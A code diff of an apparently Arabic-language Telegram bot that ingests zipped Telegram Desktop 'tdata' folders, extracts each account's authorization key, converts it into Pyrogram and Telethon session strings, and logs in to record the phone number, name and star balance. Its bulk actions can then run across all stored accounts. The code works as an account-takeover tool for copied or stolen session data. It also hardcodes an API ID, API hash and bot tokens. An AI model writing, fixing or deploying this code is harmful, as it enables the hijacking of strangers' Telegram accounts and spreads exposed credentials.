@@ -61,7 +61,7 @@ except BaseException as e:
 # --- المتغيرات الأساسية ---
 API_ID = 28797361
 API_HASH = "771041b32e83ab232e066b7adeee700b"
-BOT_TOKEN = "8960187108:AAFQcVcdZHa2OyjJgYZGtDb_MCU6VW-lsSY"
+BOT_TOKEN = "8960187108:AAGevNJ_kOtfCkvnY0rpZ3VtUZPqFfmSrr8"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -132,7 +132,7 @@ def home_keyboard():
 def accounts_action_keyboard(owner_id, action): 
     accounts = get_all_accounts(owner_id) 
     markup = InlineKeyboardMarkup()
-    markup.row(InlineKeyboardButton("🌍 الجميع", callback_data=f"act_{action}all"))
+    markup.row(InlineKeyboardButton("🌍 الجميع", callback_data=f"act_{action}_all"))
     for acc_id, phone, name, stars in accounts:
         markup.row(InlineKeyboardButton(f"{phone} | {name} | ⭐ {stars}", callback_data=f"act_{action}_{acc_id}")) 
     markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_home")) 
@@ -277,16 +277,14 @@ async def perform_action_async(action, acc_id, owner_id):
     return result_msg
 
 # =========================================================
-# ⚙️ محرك الـ TDATA الاحترافي الصافي (صياد الـ Auth Key)
+# ⚙️ محرك الـ TDATA الاحترافي (محدث بالكامل لمنع الـ 404)
 # =========================================================
 
 def get_dc_ip(dc_id): 
     ips = {1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100", 4: "149.154.167.90", 5: "149.154.171.5"} 
     return ips.get(dc_id, "149.154.167.51")
 
-# ✅ [تم حل المشكلة هنا]: تم التحديث لصيغة Pyrogram V2 بـ 271 بايت ليتخطى كل الأخطاء والـ 2FA
 def generate_sessions(api_id, dc_id, auth_key_bytes, user_id=9999): 
-    # Pyrogram V2 Format (>BI?256sQ?) = 271 bytes exactly (DC, API_ID, Test, AuthKey, UserID, is_bot)
     pyro_packed = struct.pack(">BI?256sQ?", dc_id, api_id, False, auth_key_bytes, user_id, False) 
     pyro_session = base64.urlsafe_b64encode(pyro_packed).decode("utf-8").rstrip("=")
 
@@ -298,12 +296,10 @@ def generate_sessions(api_id, dc_id, auth_key_bytes, user_id=9999):
 
     return pyro_session, session.save()
 
-# دالة الاستخراج الاحترافية والوحيدة للـ TDATA
 async def extract_tdata_official(base_dir): 
     if not OPENTELE_AVAILABLE: return None, None, None
 
     tdata_path = None
-    # الغوص في المجلدات والبحث الشامل والمباشر عن ملف الـ key_datas
     for root, dirs, files in os.walk(base_dir):
         if 'key_datas' in files:
             tdata_path = root
@@ -315,61 +311,57 @@ async def extract_tdata_official(base_dir):
         tdesk = TDesktop(tdata_path)
         if not tdesk.isLoaded(): return None, None, None
             
-        # خوارزمية الصياد لفحص كتل الذاكرة بحثاً عن الـ 256 بايت للمفتاح (تعمل كطوق نجاة)
-        def hunt_key(obj, depth=0, visited=None):
-            if visited is None: visited = set()
-            if id(obj) in visited or depth > 5: return None
-            visited.add(id(obj))
-            
-            if isinstance(obj, bytes) and len(obj) == 256: return obj
-            if hasattr(obj, 'key') and isinstance(getattr(obj, 'key'), bytes) and len(getattr(obj, 'key')) == 256:
-                return getattr(obj, 'key')
+        # 🎯 دالة جديدة صارمة: تسحب الـ AuthKey الرسمي فقط وترفض أي مفاتيح عشوائية
+        def get_real_auth(acc):
+            auth_key = None
+            # استخراج من كائن opentele مباشرة
+            if hasattr(acc, 'authKey') and acc.authKey:
+                auth_key = acc.authKey.key if hasattr(acc.authKey, 'key') else acc.authKey
+            elif hasattr(acc, 'api') and acc.api and hasattr(acc.api, 'auth_key'):
+                auth_key = acc.api.auth_key.key if hasattr(acc.api.auth_key, 'key') else acc.api.auth_key
                 
-            if isinstance(obj, dict):
-                for v in obj.values():
-                    res = hunt_key(v, depth+1, visited)
-                    if res: return res
-            elif isinstance(obj, list):
-                for v in obj:
-                    res = hunt_key(v, depth+1, visited)
-                    if res: return res
-            elif hasattr(obj, '__dict__'):
-                for k, v in vars(obj).items():
-                    res = hunt_key(v, depth+1, visited)
-                    if res: return res
-            return None
-
-        auth_key, dc_id, user_id = None, None, 9999
-        
-        # استخراج مباشر وأكثر مرونة
-        if hasattr(tdesk, 'accounts') and tdesk.accounts:
-            for acc in tdesk.accounts:
-                user_id = getattr(acc, 'UserId', getattr(acc, 'id', 9999))
-                auth_key = hunt_key(acc)
-                dc_id = getattr(acc, 'MainDcId', getattr(acc, 'mainDcId', getattr(acc, 'dcId', None)))
-                if not dc_id and hasattr(acc, 'api'):
-                    dc_id = getattr(acc.api, 'dc_id', getattr(acc.api, 'MainDcId', None))
-                if auth_key and dc_id: return int(dc_id), auth_key, user_id
-                    
-        if hasattr(tdesk, 'mainAccount'):
-            acc = tdesk.mainAccount
-            user_id = getattr(acc, 'UserId', getattr(acc, 'id', 9999))
-            auth_key = hunt_key(acc)
             dc_id = getattr(acc, 'MainDcId', getattr(acc, 'mainDcId', getattr(acc, 'dcId', None)))
             if not dc_id and hasattr(acc, 'api'):
                 dc_id = getattr(acc.api, 'dc_id', getattr(acc.api, 'MainDcId', None))
-            if auth_key: return int(dc_id or 2), auth_key, user_id
+                
+            user_id = getattr(acc, 'UserId', getattr(acc, 'id', 9999))
+            
+            # التأكد أنه بايت بحجم 256 الفعلي ومسجل لـ DC
+            if isinstance(auth_key, bytes) and len(auth_key) == 256 and dc_id:
+                return int(dc_id), auth_key, int(user_id)
+            return None, None, None
+
+        # فحص الحسابات المسجلة
+        if hasattr(tdesk, 'accounts') and tdesk.accounts:
+            for acc in tdesk.accounts:
+                d, a, u = get_real_auth(acc)
+                if d and a: return d, a, u
+
+        # فحص الحساب الرئيسي (إن وجد)
+        if hasattr(tdesk, 'mainAccount') and tdesk.mainAccount:
+            d, a, u = get_real_auth(tdesk.mainAccount)
+            if d and a: return d, a, u
 
         return None, None, None
-    except: return None, None, None
+    except Exception as e:
+        logging.error(f"Error extracting TDATA: {e}")
+        return None, None, None
 
 async def verify_and_save_async(owner_id, dc_id, auth_key, user_id, stype): 
-    # إرسال مفتاح الـ API ليتوافق مع تحديث بايروجرام الأخير وتفادي جميع مشاكل الإتصال
     pyro_session, tl_session = generate_sessions(API_ID, dc_id, auth_key, user_id) 
     client = Client(f"verify_{owner_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True) 
     
-    await client.connect() 
-    me = await client.get_me() 
+    try:
+        await client.connect() 
+        me = await client.get_me() 
+    except AuthKeyUnregistered:
+        # ⚠️ إذا طبع السيرفر 404 (الجلسة مسجل خروجها أو تالفة) يتم لقطها هنا بدل التسبب بانهيار
+        logging.warning("⚠️ تم رفض الجلسة (AuthKeyUnregistered) - الحساب مسجل خروج.")
+        return None, None, None
+    except Exception as e:
+        logging.warning(f"⚠️ فشل الاتصال: {e}")
+        return None, None, None
+
     phone, first_name = me.phone_number or "Unknown", me.first_name or "User"
 
     try:
@@ -408,17 +400,19 @@ def handle_files(message):
         with zipfile.ZipFile(local_path, 'r') as zip_ref: 
             zip_ref.extractall(extract_dir)
         
-        # استدعاء الدالة الاحترافية للـ TDATA مباشرة
         dc_id, auth_key, user_id = asyncio.run(extract_tdata_official(extract_dir))
         
         if dc_id and auth_key:
             p, n, s = asyncio.run(verify_and_save_async(message.from_user.id, dc_id, auth_key, user_id, "TDATA Account"))
-            results.append(f"✅ {p} ({n}) ⭐ {s}")
+            if p:
+                results.append(f"✅ {p} ({n}) ⭐ {s}")
+            else:
+                results.append("❌ الجلسة معطوبة أو تم تسجيل الخروج منها (مرفوضة من تليجرام).")
 
         if results:
-            bot.edit_message_text("**تمت إضافة حساب الـ TDATA بنجاح:**\n\n" + "\n".join(results), message.chat.id, status_msg.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")
+            bot.edit_message_text("**تمت معالجة ملف الـ TDATA:**\n\n" + "\n".join(results), message.chat.id, status_msg.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")
         else:
-            bot.edit_message_text("❌ لم يتم العثور على ملفات TDATA صالحة داخل الـ ZIP. تأكد من وجود مجلد الـ TDATA السليم.", message.chat.id, status_msg.message_id, reply_markup=home_keyboard())
+            bot.edit_message_text("❌ لم يتم العثور على حساب صالح داخل الـ ZIP. (قد يكون الملف فارغ أو لا يحتوي حسابات نشطة).", message.chat.id, status_msg.message_id, reply_markup=home_keyboard())
     except Exception as e:
         bot.edit_message_text("❌ حدث خطأ أثناء معالجة الملف المضغوط.", message.chat.id, status_msg.message_id, reply_markup=home_keyboard())
         logging.error(f"Error: {e}")
